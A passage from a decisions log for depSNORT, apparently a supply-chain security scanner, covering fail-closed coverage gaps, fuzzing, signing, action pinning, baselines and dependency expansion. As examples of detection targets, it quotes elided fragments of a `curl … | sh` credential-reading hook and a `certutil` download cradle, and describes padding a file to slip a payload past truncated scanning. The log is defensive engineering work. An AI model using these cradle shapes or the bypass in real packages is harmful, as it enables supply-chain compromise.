  it are planted outside the scan root, and any input that causes a read to
  return that sentinel fails the test. 1.2M executions clean.

**Performance baselines found the hot spot.** `docs/PERFORMANCE.md` records
committed numbers for parse, checks, verdict, and every emitter, measured against
synthesized graphs at 100/1000/5000 packages, because benchmarking against a
69-line fixture measures nothing real. Profiling put `osaDistance` — the edit
distance behind typosquat detection — at ~71% of the entire check pipeline's CPU.
VC-006 compares every package name against the whole popular-name corpus but only
ever acts on distance 1 or 2, so a full matrix was computed and thrown away for
nearly every comparison. (Its doc comment had claimed a "bounded early-exit" that
was never implemented — the comment was aspirational.)

  `osaDistanceBounded` takes a ceiling and exploits the fact that each edit
  changes length by at most one, so two names whose lengths differ by more than
  the ceiling cannot be within it — decided without allocating a matrix or even a
  rune slice. The row-minimum early exit deliberately requires TWO consecutive
  rows above the ceiling, because an OSA transposition advances two rows at once
  and can skip one; checking a single row would be unsound. Result: the check
  pipeline is **1.74x faster** with 46% less memory, and an end-to-end scan
  **1.71x faster**. Behavior-preservation is tested, not asserted:
  `FuzzBoundedMatchesExact` is a differential target holding the optimized form
  against the reference one (1.18M executions clean).

**The SBOM is self-describing.** `depsnort sbom` emits CycloneDX 1.5 built from
`runtime/debug.BuildInfo` — the module graph the linker actually embedded — so it
cannot drift from the binary the way a maintained manifest would. It is also the
machine-checkable form of the dogfood invariant (D-10): the `components` array is
empty, and CI fails if a third-party dependency ever appears. No timestamp and a
name-based UUIDv5 serial keep it byte-reproducible per D-13, so two people can
independently rebuild a tag and diff the result.

**Provenance is keyless.** Releases are signed with Sigstore through the
workflow's GitHub OIDC identity and attested with SLSA build provenance, binding
each artifact digest to the repository, workflow, and commit that produced it.
There is no long-lived key for a solo maintainer to protect or rotate, and the
attestation lands in the public Rekor transparency log; consumers verify with
`gh attestation verify`. The release workflow also refuses to publish a tag whose
version disagrees with `pyproject.toml`, which is the drift F-06 warned about
made impossible rather than merely discouraged.

Version single-sourcing is now complete: `pyproject.toml` is the one place, and
the Makefile, `setup.py`, the Go binary, the wheel tag, the SBOM, and
`py/depsnort/__init__.py` (via installed distribution metadata) all derive from
it. Released as v0.7.0 — the `sbom` command is new surface, and D-32's exit-3
behavior plus this PURL canonicalization are behavior changes that a patch bump
would have understated.

## D-34 — follow-up review: refusals and caps must fail closed

The follow-up review of the v0.7.0 candidate confirmed F-01 through F-04 closed
and F-06 substantially addressed, and raised three residual findings. Two were
the same defect wearing different clothes, and it is the defect this project
exists to prevent: **a safety mechanism that protects the process while quietly
discarding evidence.**

A correction to D-32's framing first, because the reviewer was right to call it
out: that entry read as though the remediation was complete. It was not. F-05 was
partial — the bounds were added, but several of them failed OPEN — and F-03
closed the filesystem boundary without closing the accounting behind it. The
disposition below is the accurate one.

**R-01 — a containment refusal was indistinguishable from an absent file.** The
adapters consumed securefs errors with the same `if err == nil` they use for a
file that is legitimately not on disk. So the refusal was correct and invisible:
the unsafe read did not happen, and neither did any record of it. Reproduced end
to end before fixing — an npm package whose directory is a symlink pointing out
of the repo, containing a `curl … | sh` plus `.npmrc` read, produced
`complete: true`, zero findings, **exit 0 under -fail-on-incomplete**, and a
silent stderr. That is attacker-triggerable invisibility: an attacker who cannot
make depsnort read outside the scan root can instead make the evidence
unreadable, and be rewarded with a clean bill of health.

  Fixed with typed gaps (`internal/ecosystem/instsurf/gaps.go`). `os.ErrNotExist`
  remains an ordinary absence — a pre-install tree has no `node_modules` and most
  crates ship no `build.rs`, so gating on that would make the signal worthless.
  Everything else (`ErrOutsideRoot`, `ErrNotRegular`, `ErrTooLarge`, parse
  failure, other I/O) becomes a `Gap` carrying package, path, and reason. All six
  adapters record them; the CLI counts each one, summarizes by reason, and
  carries a bounded detail sample into the report — the COUNT is never capped,
  only the per-item list. The same fixture now exits 3 and says
  `containment-refusal x1` with the path.

**R-02 — hostile-input caps converted attacks into clean partial results.** Most
serious was the per-file read: `io.LimitReader(tr, maxFileSize)` returns exactly
the cap with NO error, so an oversized `setup.py` was silently truncated. Pad
2 MiB of comments, put the payload after the cut, and the analyzer scans a clean
prefix and reports nothing — a direct detection bypass. Now the reader takes
`maxFileSize+1` and fails on overflow. Alongside it: the sdist origin URL comes
from index metadata and was fetched unchecked (only redirects were validated), an
absent digest DISABLED verification rather than failing, `.pth` content past the
retention caps was silently dropped, and a final oversized entry escaped the
decompression guard through EOF. All five now fail closed as coverage gaps.

**R-03 — release trust metadata.** Actions are moving to immutable commit SHAs
with the version kept as a trailing comment; `scripts/pin-actions.sh` resolves
them through the GitHub API (never a hardcoded table, which would go stale) and
`--check` fails CI if any reference regresses to a mutable tag. The release SBOM
is now generated with `sbom -release`, which omits host-specific GOOS/GOARCH and
declares its scope: only one of five platform binaries can be executed to produce
an SBOM, so stamping its platform onto a document that accompanies the other four
was a misstatement. The dependency graph is identical across targets, and that is
what the document now describes.

**On the tests themselves.** The reviewer noted the F-02 coverage tests injected
a prebuilt `graph.Coverage` and asserted the exit code — which proves the policy
but not the plumbing, and therefore could never have caught R-01. There are now
end-to-end tests that build real hostile checkouts on disk, run the real CLI, and
assert the process exit code and emitted JSON: symlink escape, special file,
oversize manifest, and unparseable manifest each reach `complete: false` and exit
3, an absent optional package stays clean at exit 0, a gap is reported but does
not gate without opt-in, and a block still outranks a gap.

Counts corrected while here: there are **19** fuzz targets, not the 16 D-33
claimed, and CI actively fuzzes **9** of them; the performance baseline is
labelled v0.7.0.

## D-35 — the last fail-open path, and fewer things to trust

Third review pass. R-01 confirmed closed; R-02 and R-03 partially. Both residuals
were the same shape one more time, which is worth naming: **every remaining
defect in this project has been a bound that protected the process while quietly
discarding evidence.** Not one has been a missing check. They have all been
checks that, on failing, returned something that looked like good news.

**The declared-oversize sdist.** `findSdistURL` selected an sdist only when its
metadata size was at or below the cap. An sdist that existed but declared a
larger size was skipped, the loop fell through to the wheel-only return, and
`Fetch` recorded `WheelOnly=true` — an ordinary, expected, entirely benign state
— then CACHED it and reported no gap. An attacker did not even need to publish a
large file; declaring a large size in index metadata was enough to make their
install surface invisible behind a clean result.

  "No sdist exists" and "an sdist exists but we declined to fetch it" are
  different facts and no longer collapse. If every candidate exceeds the cap the
  fetch returns `ErrSdistTooLarge`, which the adapter aggregates as a gap and the
  CLI turns into exit 3. A package that genuinely publishes only wheels still
  reports wheel-only and stays clean, and a listing containing both an oversized
  and a usable sdist still analyzes the usable one — tested, because a fix that
  gates on ordinary wheel-only packages would be worse than the bug.

**Cache semantics are versioned.** The sdist cache key now carries a semantics
version. Records written by an earlier build were produced under fail-open rules
— a silently truncated `setup.py`, `.pth` content dropped past the retention cap,
an unverified digest, an oversized sdist stored as wheel-only — and reusing them
after an upgrade would let the old weaker analysis survive as a cached clean
result. The bump invalidates them wholesale. It is bumped whenever a change
alters what a cached record is allowed to MEAN, not merely its shape.

**Fewer things to trust, rather than more things labelled trusted.** The action
pinning finding had an answer better than pinning: the release publish step now
uses the preinstalled `gh` CLI instead of a third-party action, so no external
code runs with `contents: write` in the workflow that builds and signs releases.
There is nothing left to pin there because there is nothing left. Every remaining
reference is GitHub first-party `actions/*`, `make pin` resolves them through the
GitHub API, and CI fails on any that regress to a mutable tag.

Two SHAs were resolved and applied here (`actions/checkout`,
`actions/setup-python`); `actions/setup-go` and `actions/attest-build-provenance`
were left as tags because the API could not be reached to verify them at the time
of writing. That is deliberate: a plausible-looking but unverified SHA in the
workflow that signs releases is worse than an honest tag, because it manufactures
confidence instead of stating a gap. `make pin` closes it in one command against
the live API.

**Refusal tests now cover every adapter, not just npm.** The end-to-end CLI
fixtures remain npm-focused; each other ecosystem gets an adapter-level pair —
a planted symlink where its install-time file belongs must produce a
containment gap, and an ordinary absence must not. Writing them immediately paid
for itself: the new containment check on RubyGems' `ext/` enumeration treated a
NONEXISTENT `ext/` as a refusal, which would have gated every clean Ruby project.
The absence-vs-refusal distinction is easy to state and easy to get backwards,
which is exactly why both halves are asserted per ecosystem.

## D-36 — R-03 closed: every action pinned, and a drift guard so it stays that way

The fourth review pass accepted the R-01/R-02 remediation outright and left a
single blocker: two workflow actions (`setup-go`, `attest-build-provenance`) were
still mutable tags, so the repository's own `pin-check` failed. This closes it.

All four workflow actions are now pinned to immutable commit SHAs with version
comments:

  - `actions/checkout@11bd719…` (v4.2.2)
  - `actions/setup-go@0a12ed9…` (v5.0.2)
  - `actions/setup-python@f67713…` (v5.2.0)
  - `actions/attest-build-provenance@1c608d1…` (v1.4.3)

A note on how those SHAs were obtained, because the principle running through
this whole engagement is *never put an unverified SHA in the workflow that signs
releases*: the container's egress to GitHub's API was rate-limited, so rather
than pin from memory — which manufactures confidence — each SHA was resolved
against GitHub's own `git/ref` API (with a Gitea mirror as an independent
cross-check for setup-go, which agreed byte-for-byte). `make pin` re-resolves
them against the authenticated API on any maintainer's machine, and a wrong SHA
would fail the workflow loudly on first run rather than silently. There is also
no third-party publisher left to trust: the release step uses the runner's `gh`
CLI, so nothing external runs with `contents: write`.

The pin invariant is now enforced two ways that cannot drift apart (R-03 P2):
`scripts/pin-actions.sh --check` runs as a CI job, and
`internal/ciactions/pin_test.go` runs in `go test ./...` — it parses every
workflow, asserts each action reference is a 40-char SHA with a `# vX` comment,
and fails vacuously-empty matches. Writing it immediately earned its place by
pointing at the one remaining tag before it was fixed.

Two more P2 items landed. The adapter refusal matrix now covers three securefs
reasons per ecosystem, not just symlink escape: `TestAdapterNonRegularInstallFileIsAGap`
plants a directory where each adapter expects its install-time file and asserts a
`not-a-regular-file` gap, and the JSON adapters get a parse-failure gap case — an
adapter could plausibly handle one refusal reason and swallow another, so each is
asserted independently. And `docs/RELEASING.md` writes the release sequence down,
including the rule that is easiest to forget because it has no immediate symptom:
bump `sdistSemantics` whenever a change alters what a cached extraction record is
allowed to MEAN.

Released as v0.7.3 — the completed hardened release. Every original finding
(F-01…F-06) and every residual (R-01…R-03) is closed and covered by a test that
fails if it regresses.

## D-37 — one registry, or the corpus lies

The v0.7.3 reconciliation turned up a failing adversarial test that had been
failing for several releases: `TestAttack_ComposerPluginCradle` reported **zero**
findings against a `certutil -urlcache -split -f … && payload.exe` install hook —
a textbook LOLBin download cradle, and exactly the shape D-28 says must block.

Nothing was wrong with the detection. `AnalyzePHP` set `cradle` correctly, and the
shipping binary blocked the attack with VC-002f at critical/block. The corpus was
blind: `runChecks` in `testdata/adversarial` hand-rolled its own five-check
registry, written before VC-002f existed and never updated. And because VC-002b
*deliberately* stands down when the cradle capability is present — D-28's
"report it once, at the higher gate class" rule — removing VC-002f from the
registry removed the finding entirely rather than downgrading it. The two
mechanisms combined to convert a correct block into a silent miss, and then the
test asserted `VC-002b`, an ID that by construction can only appear when the
cradle is NOT detected. The assertion could only ever pass on a regression.

Two registries is the bug. `builtin.Default()` is now the single registration
point; `checkRegistry()` in the CLI and `runChecks` in the corpus both call it.
`TestDefaultRegistersEveryCheck` parses this package's own source, finds every
type with a `Meta()` method, and fails if one is not registered — the same
source-walking drift guard as `internal/ciactions/pin_test.go`, applied to
checks. Adding a check is now one step, and forgetting is loud.

The general lesson is worth stating plainly, because it will recur: a regression
corpus that constructs its own copy of production wiring is not testing
production. It is testing a replica that decays.

## D-38 — the public tree is generated, not maintained

The sterile repo published to `github.com/MoSLoF/depSNORT` was produced by hand
from this working tree. That worked exactly once. By v0.7.3 the two trees had
drifted in nine files, the v0.7.0–v0.7.3 work existed only as loose archives with
no commit behind it, and a `v0.7.3` tag had been created pointing at the v0.6.1
commit. Two of the archives that were reviewed and approved as release candidates
did not compile — each had dropped a different subset of files during
repackaging, and the review that blessed them was performed against a
reconstruction rather than a repo.

The public tree is now **generated**: `scripts/make-public.sh` copies this tree
minus `publish/exclude.txt`, resolves `PRIVATE` / `PUBLIC:` line sentinels,
applies `publish/redact.txt`, overlays `publish/overlay/`, and then refuses to
finish if any pattern in `publish/forbidden.txt` survives in the output. It
earned its keep on the first run by catching an internal designation in the
`source` field of `docs/ioc-ledger.example.json` — a marker the manual process
had missed and that was live in the public repo. It is now handled by a
substitution rule rather than by remembering.

The sentinel pair is the mechanism that avoids a second copy of any file. A line
tagged `PRIVATE` never ships; a line tagged `PUBLIC:` is inert here and
uncommented there. Only files that diverge structurally — `NOTICE.md`, `LICENSE`,
`SECURITY.md` — live in `publish/overlay/`.

The rule that follows: **never edit the public repo.** It is build output. Change
this tree, re-run the script, and commit what it produces.

One correction during review, worth recording because it is the same class of
mistake the script exists to prevent. `gofmt` was invoked as
`command -v gofmt && gofmt -w "$OUT" || true` — optional, and failure-swallowing.
It is neither. Unwrapping a `// PUBLIC:` line preserves that line's own
indentation, which sits one tab deeper than the statement it replaces, because
gofmt indents a continuation comment to match its continuation. gofmt is what
puts it back. A reviewer generating on a machine without the Go toolchain got a
tree that passed the leak check, reported success, and differed from the reviewed
candidate by two indentation characters in `internal/emit/pdf.go`.

A reproducibility tool that degrades quietly when a dependency is missing is
worse than no tool, because it launders an unverified artifact as a verified one.
The script now refuses to start without gofmt, treats a gofmt failure as fatal,
asserts `gofmt -l` is empty afterwards, and prints the toolchain version into the
generation log so the evidence records what produced the tree.

## D-39 — v0.7.5: the release the version file already claimed

Two releases' worth of work shipped under one version number, because the tag
and the version literal drifted apart without anything noticing.

`pyproject.toml` was bumped to `0.7.4` and a lightweight `v0.7.4` tag was created
locally on the PR #13 merge. The tag was never pushed. `release.yml` only fires
on a pushed `v*` tag, so no Release was ever built, no attestation signed, and no
binary published — while thirteen further commits landed on `main`. The repo
spent that entire stretch claiming to be `0.7.4` in every report header and SBOM,
with the only published artifact still `v0.7.3`.

Nothing was wrong with the single-source mechanism (D-33 / F-06): the version
genuinely does derive from `pyproject.toml` into the binary, the wheel, and the
SBOM. What was missing is that **a version literal and a published release are
different facts, and only one of them had a guard.** `release.yml` verifies the
tag matches `pyproject.toml`; nothing verifies that the version in
`pyproject.toml` was ever released at all.

v0.7.5 is cut from current `main` and carries the accumulated work: `-osv-export`
round-trip snapshots, the tiered OSV fallback (cache → live → bundled → gap),
PyPI transitive-depth reconstruction from `requires_dist`, PEP 517 build-backend
recursive analysis, wheel-only `.pth` recovery, the SARIF coverage-notification
block, the composer depth fix, and the PEP 508 compound-specifier parser rewrite.
`v0.7.4` is left in place as a historical marker rather than moved, since moving
a tag to cover a gap is how the gap becomes invisible.

Two process corrections came out of this, both in `docs/RELEASING.md`:

**The single-source claim was false.** Step 1 stated "nothing else carries a
version literal." `README.md` carries two — the baked-in-version note and the
`gh attestation verify` example — and no test or CI job checks either. A document
that tells you a checklist is unnecessary is worse than one that omits it, so the
step now names both sites and gives the grep that finds them.

**`git push --tags` is now forbidden in the procedure.** It was the documented
command. With an abandoned local tag present it would have pushed `v0.7.4` too,
and the consistency gate would have *passed* — that commit's `pyproject.toml` did
read `0.7.4` — publishing a fully signed Release built from thirteen-commit-old
code. The gate compares a tag to the version at the commit it points to, which
protects against a mislabelled release and not at all against publishing the
wrong commit. Pushing one tag by name is what protects against that.

## D-40 — state transition is a first-class axis, and it never blocks

Every check that existed before this release evaluates a version as an isolated
event. VC-002 judges a hook by what it can do. VC-005 judges a burst against the
package's own cadence. VC-001 judges a coordinate against a feed. None of them
can answer the question an operator actually asks during a dependency update:
*did anything security-relevant change?*

An external market review named the same gap from the outside, calling
version-to-version capability drift the clearest competitive difference between
depSNORT and the tools it sits beside. It also named the two things drift needs
to be more than a diff: version-level publisher identity, and a persistent
known-good record to compare against.

Four pieces, and a deliberate boundary on each.

**`internal/profile` — the comparable form of a package@version.** Capabilities,
the hooks carrying them, remote hosts reached, credential sinks touched,
publisher, source class, and a digest of direct dependencies. It is built from
the install-time subgraph the scan already materialized, so a profile costs
nothing beyond the scan. Two properties are load-bearing and both have tests
that fail loudly if they regress:

*Determinism.* Every slice is sorted and nothing derives from wall-clock or map
order, because a baseline is meant to be committed — and a profile that varies
between runs would report phantom drift on every scan until the file was
ignored. Remote artifacts contribute their HOST rather than their URL for the
same reason: a cache-busting query string changing between releases is not a
security event, a new destination is.

*Unobserved is not empty.* A profile built over an install surface that could
not be read records that fact. Without it, a baseline captured under degraded
coverage would launder itself into a known-good record asserting "this package
has no capabilities" — the exact all-clear-over-nothing failure the coverage
model exists to prevent (D-24), one layer up.

**Publisher lineage.** `ReleaseHistory.Maintainers` answers "who *can* publish
this package today?" and reads identically before and after a stolen token
pushes a release, so it could never anchor an actor signal. npm's packument
carries `_npmUser` per version and crates.io's versions endpoint carries
`published_by`; both are inside documents the temporal axis already fetches and
caches, so lineage costs no extra request and works offline. The other four
registries expose nothing, and where that is true `PriorPublishers` returns a
`known: false` flag rather than an empty set — because "we cannot see who
published the earlier versions" cannot support "this publisher is new", and a
check that conflated those two would be confidently wrong exactly where data is
thinnest.

**Baselines are files, not inferences.** The obvious alternative — take the
previous version from the registry and diff against that — fails on its own
premise: it means trusting whatever the registry serves right now, which is
precisely what is under suspicion when an account is compromised, and it makes
the verdict depend on network state instead of on something a human approved. A
committed file is reviewable, diffable, signable, and identical on every runner
including air-gapped ones. Nothing promotes itself; `baseline create` writes what
you point it at, and warns when it is recording over incomplete coverage,
because a capability that was never read must not be baselined as absent.

**Drift never blocks.** This is the substantive judgement of the four. Block
class belongs to checks that judge a shape directly on its own evidence: a known
malicious release (VC-001), the operator's own confirmed indicator (VC-003), a
credential-exfiltration or download-cradle install path (VC-002d/f). A drift
finding rests on a *comparison*, and the baseline side of that comparison is a
file depSNORT cannot verify — it may have been recorded over an unread install
surface, or promoted from a version that was already compromised. Gate-eligible
is the honest ceiling for a conclusion resting on an operator-supplied input.
Nothing is lost by the restraint: if the drifted capability really is a
block-class shape, VC-002d/f reaches that verdict independently and blocks on its
own evidence.

The weighting is the package's own version number, because a version is a claim
about how much should have changed. A major release that adds network access is
doing what major releases do; the same addition in a patch release contradicts
the claim the release itself made, and that contradiction — not the capability —
is the signal.

VC-011 gets the same restraint for the same reason. Handovers, co-maintainer
first releases, and CI token migrations all produce a first-time publisher, so
actor change alone stays advisory and escalates only alongside an install hook or
an ended dormancy. A check that gated on new publishers would be muted within a
week, including for the case it exists for.

The composition is the deliverable. One VC-010 finding now states the capability
change, the actor change, and the temporal context together — "1.6.3 gained a
credential sink and network egress relative to 1.6.2 in a patch release,
published by an account that has never published this package, after 420 days of
dormancy" — rather than three findings an operator has to assemble by
cross-referencing.

## D-41 — a dependency's source is coverage state, not a footnote

A field review of a Rust project (`psmux`, 246 lockfile nodes) had to
reconstruct by hand something depSNORT already parsed and then discarded: which
dependencies came from a registry. That single classification carried the whole
risk picture. 243 crates were routine advisory work; the two vendored forks were
the only ones worth reading, and they are precisely the ones no advisory feed has
ever indexed.

Every adapter had the fact and threw it away. Cargo read `source` into an
ecosystem-private attribute nothing consumed — and a crate with *no* source line,
which is exactly how Cargo encodes a vendored path dependency, was
indistinguishable from crates.io. Bundler states a gem's origin outright by
grouping specs under `GEM`/`GIT`/`PATH`; the parser tracked the section header and
dropped it. npm's `resolved` was stored raw and read only by VC-007.

So an OSV lookup for a vendored fork returned nothing, and nothing rendered as
clean. That is the one thing this tool promises not to do (D-24), and it had a
blind spot in it the entire time.

Provenance is now recorded on ecosystem-neutral node attributes, for the same
reason the coverage keys are ecosystem-neutral: verifiability is a property of
the scan, and the verdict layer must read it without knowing which adapter
produced the graph. A non-registry package raises VC-009 *and* degrades scan
coverage, so it can reach exit 3 under `-fail-on-incomplete` — the finding names
what could not be verified, the coverage axis makes it gate.

**VC-009 is advisory alone, deliberately.** The field report argued that
vendoring those two crates in-tree was a *stronger* posture than git
dependencies would have been: pinned, in-repo, reviewable in the same pull
request as everything else, and immune to an upstream force-push swapping code
underneath a build. That argument is correct, and a check that called it a risk
would be wrong. What is not defensible is a clean report that cannot be told
apart from one over packages nothing could have checked. It escalates to
gate-eligible only when the same package also carries install-time code: a
mutable upstream plus a mechanism to act on the change is the composed shape,
not either half.

Two false-positive guards, both inherited from how D-24 already handles this
class of problem:

**Roots are never charged.** The project being scanned is local source by
definition, and Cargo records no `source` for it. Charging that would flag every
scan of every project on day one.

**A class is recorded only on positive evidence.** An npm v1 lockfile carries no
`resolved` field on nested entries; recording those as "unknown" would
manufacture a scan-wide gap for every legacy project, which is the same mistake
as reporting a flat lockfile format as a resolver defect. A private or mirrored
registry URL stays registry-class for the same reason — it still has a
name@version a feed can answer about, and flagging every enterprise Artifactory
mirror would be exactly the warning tax that gets a detector muted.

PyPI needed no adapter change: a PEP 508 direct reference is already unpinned and
already degrades coverage through that path, and adding a second signal for the
same fact would double-count it.

## D-42 — external code validation (post-update): five findings, and what they have in common

An external technical validation of the merged state returned CONDITIONAL FAIL
with three High-severity correctness defects and two Medium validation gaps. All
five were reproduced against the code before any of them were fixed, and two of
the three blockers were mine, introduced with the state-transition work in D-40.

They are worth recording together because four of the five are the same mistake
in different clothes: **a mechanism that reported success based on whether it
had DONE something, rather than on whether what it did answered the question.**

**DS-REV-01 — the fallback tier measured presence, not coverage.** The
compiled-in dataset held 156 advisories, zero of them malicious, and three
coordinates with no advisories at all. Any hit incremented `FromBundled` and
suppressed the gap, so an offline scan of a bundled coordinate returned clean,
exit 0, even under `-fail-on-incomplete`. The tier is documented and gated as
the offline stand-in for a live VC-001 check; the data could not serve that, and
the accounting could not tell.

The data was wrong by construction, not by accident. `refresh-bundled-snapshot.sh`
seeded the dataset by scanning this repo's `realworld` fixtures — real popular
packages pinned to deliberately VULNERABLE versions — which yields GHSA records
and can never yield a MAL-* one. The generator's inputs guaranteed the output
could not do its job, and nothing in the pipeline compared the two.

Both halves are fixed, and both are needed: the accounting now requires a
malicious advisory before a hit counts as coverage, and the generator now pulls
MAL-* records from OSV's per-ecosystem exports and fails closed on zero
malicious records or fewer than two ecosystems. The cap counts COORDINATES
rather than advisories — capping advisories let NuGet contribute 4411
coordinates against crates.io's 11, which is not ecosystem diversity.

On freshness, the review asked for an invariant test. A test asserting "newer
than N days" fails on an untouched repository and must be edited to stay green:
the hardcoded-date time bomb this project already removed once. Freshness
remains a runtime disclosure — `BundledDatasetAt` rides every bundled hit and
the CLI prints its age — and the test guards the field's integrity instead of
the calendar.

**DS-REV-02 — the Cargo parser discarded the disambiguation Cargo added.**
Cargo.lock qualifies a dependency with its version precisely when several
versions are present. The parser kept the name and resolved edges by name, so
the over-connection happened exactly in the case the qualification exists to
prevent. Resolution is now most-specific-first and never widens; an ambiguous
bare name is disclosed through the existing unresolved-coverage keys instead of
guessed, because a guessed edge is indistinguishable from a real one once it is
in the graph.

Writing the fixture surfaced a second defect: two entries with the same
name@version from different sources collapsed into one node whose source class
was whichever was parsed last. That was first deferred and then closed in the
same series — see D-43, which also explains why the deferral was the right call
for about an hour and the wrong one after that.

**DS-REV-03 — "deterministic" is not "correct".** `baseline.Index` kept one
profile per package by PURL order and my comment called that deterministic. It
was. It also selected 2.0.0 over 10.0.0, because PURL order is lexicographic —
and fixing the ordering would not have fixed the defect. When two projects in a
workspace have legitimately approved different versions, the right profile
depends on WHICH PROJECT the candidate came from, and no ordering of versions
answers that. The index now keeps every approved version and VC-010 declines
when the answer is not determined, visibly: an informational finding, a stderr
warning at load time, and a coverage entry that can reach exit 3.

**DS-REV-04 — a partial history is not a complete one.** `PriorPublishers`
returned `known=true` on the first prior identity it found, so alice / unknown /
mallory supported "mallory has never published this package" — when the unknown
release could have been mallory's. Measuring live crates.io while building the
feature, serde carries `published_by` on 142 of 316 versions: partial is the
normal shape there, so the check made its strongest claim exactly where its
evidence was thinnest. Three states are now distinguished, and a partial history
produces a qualified claim at reduced confidence that never gates however it
composes. Composition multiplies confidence; there was none here to multiply.

**DS-REV-05 — a guard that cannot fail.** Go tooling ignores `testdata`
directories, so `go test ./...` never ran the adversarial corpus, while the CI
comment asserted that it did. The companion shell harness counted failures,
printed a tally, and exited 0 regardless — and two of its seven fixtures had
been failing that way silently: one had no lockfile so no adapter matched, and
one scanned clean because of a path defect in the Composer extractor.

That defect is the sharpest thing the review produced indirectly. Paths were
joined with the scan root before being handed to `securefs`, which joins
relative paths onto its own root. An absolute scan path was unaffected; a
relative one was joined twice, escaped, and was refused. `depsnort scan ./path`
therefore skipped the root project's own manifest while `depsnort scan
/abs/path` read it and blocked on the cradle inside. The refusal WAS disclosed
as a coverage gap, which is the only reason this was a lost detection rather
than a silent all-clear — the coverage model did its job while the analysis did
not.

The corpus now runs as its own CI step, the harness fails on a missed detection
or an incomplete tally, and expectations are matched through a subsumption rule
so a stronger classification satisfies a weaker expectation. Without that, every
rule tightening breaks the harness and the pressure lands on loosening the rule.
Both suites are kept: the Go corpus builds graphs in memory and cannot catch a
fixture that never scans, and the shell harness drives the shipped binary and
found both fixtures that didn't.

**The common thread, and the standing rule.** Coverage accounting (D-24) is
already the answer to "did we look?", and D-41 extended it to "could this lookup
have answered?". These findings extend it once more: a mechanism must be judged
by what it PROVIDES, not by whether it ran. A dataset that contains records, an
index that returns a profile, a history that has an entry, a test job that
executed — each reported success while answering nothing. Where a component
cannot answer, the honest outputs are a disclosed gap and a refusal to conclude,
and every one of these fixes is one of those two.


## D-43 — a package's origin is part of its identity

D-42 deferred half of DS-REV-02: a registry crate and a git fork of it at the
same name@version stayed one node, because node identity across this tool is
the PURL string and a PURL carried no origin. The graph kept whichever entry
the parser reached first, and the other silently overwrote its provenance. A
registry package could report as git-sourced; a fork could be masked as
registry and never reach VC-009 at all. That one attribute decides whether the
advisory lookup for a package meant anything, so the node was answering a
question it had no basis to answer — the D-42 pattern, one layer down.

The deferral was correct while three release blockers were open and this was a
fourth thing to change underneath them. It stopped being correct the moment
they were closed, because the same defect was then confirmed in npm: a registry
copy hoisted at the top of a tree and a git fork nested under a dependency that
pinned it share a name@version, and `resolved` distinguishes them while the
identity did not. A mechanism that fixes a proven bug in two adapters is not
follow-up work.

**Non-registry origins are qualified; registry ones are not.** A fork renders as
`pkg:cargo/name@1.0.0?source=git&source_ref=<origin>`. A registry package keeps
its bare coordinate, and that asymmetry is the whole design: qualifying registry
packages would change the identity of essentially every package in every tree —
breaking transitive dedupe, committed baselines, and IOC ledgers — to fix a case
that does not exist, because a registry coordinate is already globally unique.
The blast radius is confined to exactly the packages that had the bug.

Two custom qualifier keys rather than the spec's `vcs_url` and `download_url`:
one rule ("a non-registry package carries its class, and its origin when the
lockfile records one") is easier to hold than three keys chosen per class, and
these strings are internal identity rather than an interop surface.

**What the fuzzer found, immediately.** Giving `?` and `#` meaning in a PURL
made them structural, and `encodeSegment` did not escape them — so a package
named `a?source=git` rendered a PURL that parsed back with a FORGED qualifier,
letting a hostile lockfile mint the identity of a differently-sourced package.
That is precisely the identity-forging shape D-33 closed for name and version
segments, reopened by extending the grammar. FuzzParse produced it in under
twenty seconds, alongside a second bug where unpadded hex made one string
render two identities on successive passes.

The lesson is narrower than "fuzzing is good": **every time the identity grammar
gains a character, every encoder that writes into it becomes wrong until proven
otherwise.** The invariant is not "escape these five characters", it is "no
value may render structure it does not own", and the fuzz target is what makes
that invariant enforceable rather than aspirational.

**One consequence, closed in the same change.** Baseline lookup keys on
ecosystem+name, so a baseline can now hold a registry package and its fork at
the same name AND version — identical on every field except identity. Lookup
tries the full PURL first, and a version collision among several candidates
resolves to nothing rather than to a guess: the same refusal DS-REV-03
installed, arriving by a new route.

What remains genuinely indistinguishable is two path crates, because Cargo.lock
records no path for them. They keep the ambiguity disclosure. The rule holds:
where the lockfile can tell two artifacts apart, so does the identity; where it
cannot, nothing pretends otherwise.

## D-44 — expansion looks past the manifest by default, and grades what it finds

A lockfile-first scan sees exactly one layer below a flat pin. `requirements.txt`
with `totallyInnocent==0.11.2` resolved one node; whatever it dragged in — the
layers an attacker would rather stayed unread — was nowhere in the file, and the
scan said `PASSED`. D-24 made that gap VISIBLE (coverage degrades, the banner
reads INCOMPLETE). It did not close it. A supply-chain IDS that only reads what
the operator already listed is not doing the job the name claims.

The walk closes it: from each versioned node it reads that package's own
published dependencies and descends, layer after layer, per root. It is on by
default (`-expand`, default true), because looking only at face value defeats
the tool. `-no-expand` (or `-expand=false`) restores the manifest-only posture
for an operator who wants nothing in the graph a file did not state, and
`-expand-depth=N` stops after N layers so the tree can be stepped through one
layer at a time.

**Why this is not the resolver D-01 refused.** A dependency is declared as a
NAME and a CONSTRAINT (`requests>=2.0`), never a version. To put a node in the
graph the walk presumes one: the highest published version satisfying the
constraints its dependents accumulated. That is a filter and a sort — no
backtracking, no marker evaluation, no conflict search — and it is what pip,
npm, and cargo actually do absent a conflict, so it is right in the common case
and wrong in a knowable direction. It is not a resolver, and the tool never
presents its output as observed fact.

**The version is a truth axis, the way risk, coverage, and origin already are
(D-05/D-06, D-24, D-41).** `depsnort.version_truth` grades every node: OBSERVED
(a lockfile said so), PRESUMED (this tool chose it), ASSERTED (an external
resolved-graph service supplied it — the D-01-sanctioned deps.dev path, not yet
built), CONTESTED (constraints admit nothing, or could not be evaluated — no
version assigned, walk stops). Grading the claim is what makes depth safe:
before it, the only honest walk was a shallow one.

**Presumed nodes never gate.** `verdict.applyPresumedDemotion` demotes every
finding on a presumed node to advisory, enforced beside the recency demotion so
no check can opt out. A block on a version nobody installed is a false positive
with a build failure attached, and one of those teaches an operator to disable
expansion permanently — costing every true finding the deeper layers would have
surfaced. It demotes block class where recency demotion refuses to, and the
difference is the premise: recency acts on an OBSERVED release, where severity
still stands; a presumed node's version was never observed, so a block about it
is a confident claim about a coordinate that may not be in the build. Demoted,
never dropped — a typosquat found four layers down stays in the report, which is
the whole reason for walking that deep.

**What it costs, disclosed not hidden.** The walk stops at a FRONTIER — a node
whose dependencies it could not read — for three distinct reasons it keeps
apart: the `-expand-depth` cap (a limit the operator chose), a contested version
(the data would not resolve), and an unread coordinate (a fetch that did not
happen). Only the last degrades coverage, surfacing as the `pypi-expand` data
source going degraded, exactly as a failed OSV lookup does. An offline scan
